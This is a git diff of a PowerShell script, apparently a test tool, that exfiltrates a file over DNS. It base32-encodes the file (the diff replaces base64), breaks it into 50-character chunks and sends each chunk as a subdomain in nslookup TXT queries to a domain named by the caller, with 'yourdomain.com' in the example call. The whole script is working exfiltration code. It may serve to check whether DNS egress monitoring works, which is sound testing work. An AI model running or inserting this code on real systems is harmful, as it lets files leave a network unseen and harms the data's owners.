@@ -1,19 +1,21 @@
-
 function TestDns-Exfiltration {
     param([string] $filePath, [string] $domain)
     write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"
 
     $block_size = 50
     if(Test-Path($filePath)) {
-        $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))
-        $total_requests = [math]::truncate(($base64string.length/$block_size))+1
-        write-host "[-] File length:" $base64string.length
+        
+        [byte[]] $bytes = [IO.File]::ReadAllBytes($filePath)
+        $byteArrayAsBinaryString = -join $bytes.ForEach{[Convert]::ToString($_, 2).PadLeft(8, '0')}
+        $Base32string = [regex]::Replace($byteArrayAsBinaryString, '.{5}', { param($Match) 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)] }) 
+        $total_requests = [math]::truncate(($Base32string.length/$block_size))+1
+        write-host "[-] File length:" $Base32string.length
         write-host "[-] Total requests to transfer this file:" $total_requests
         read-host "Press enter to start"
         $key_start = 0
         $key_end = $block_size
-        while($key_end -le ($base64string.length)) {
-            $payload = ($base64string[$key_start..$key_end]) -join ""
+        while($key_end -le ($Base32string.length)) {
+            $payload = ($Base32string[$key_start..$key_end]) -join ""
             $url =  "$payload.$domain"
             write-host "[!] Request to: $url" -ForegroundColor gray
             nslookup -type=TXT $url
@@ -27,4 +29,4 @@ function TestDns-Exfiltration {
    write-host "[#] Done" -ForegroundColor green
 }
 
-TestDns-Exfiltration "C:\users\public\yourfile.docx" "google.com"
+TestDns-Exfiltration "C:\users\public\testfile.docx" "yourdomain.com"
